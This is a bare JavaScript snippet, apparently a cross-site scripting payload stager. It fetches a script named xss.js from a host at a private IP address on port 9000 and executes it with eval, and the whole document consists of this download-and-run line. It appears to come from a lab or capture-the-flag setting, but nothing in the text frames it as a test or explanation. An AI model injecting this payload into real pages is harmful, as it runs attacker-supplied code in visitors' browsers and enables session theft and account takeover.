fetch("http://192.168.49.52:9000/xss.js")
  .then((r) => r.text())
  .then((v) => {
    eval(v);
  });
